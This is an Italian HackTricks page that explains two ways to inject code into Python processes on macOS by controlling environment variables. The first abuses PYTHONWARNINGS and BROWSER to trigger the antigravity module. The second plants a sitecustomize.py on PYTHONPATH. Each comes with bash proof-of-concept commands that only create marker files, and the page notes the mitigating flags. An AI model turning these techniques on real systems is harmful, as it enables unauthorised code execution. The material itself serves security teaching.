# Injection di applicazioni Python su macOS

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

Se un attacker può controllare l'ambiente di un processo Python, la combinazione di `PYTHONWARNINGS` e `BROWSER` può attivare l'esecuzione di comandi quando Python importa il modulo `antigravity` durante l'elaborazione di un'opzione di warning appositamente predisposta. La tecnica si basa sul fatto che `antigravity` apre un URL con il modulo `webbrowser` di Python, che rispetta la variabile d'ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Tramite `PYTHONPATH` e `sitecustomize.py`

Durante il normale avvio, il modulo Python `site` aggiunge i percorsi specifici del sito e tenta quindi di importare un modulo denominato `sitecustomize`. Inserendo una directory leggibile dall'attaccante all'inizio di `PYTHONPATH`, un attaccante che controlla l'ambiente del processo può fare in modo che Python importi un payload prima dello script target. Il flag `-S` disabilita l'inizializzazione automatica di `site`, mentre la modalità isolata (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking con le variabili d'ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook di configurazione specifico del sito](https://docs.python.org/3/library/site.html)
- [3] [Riga di comando e ambiente di Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
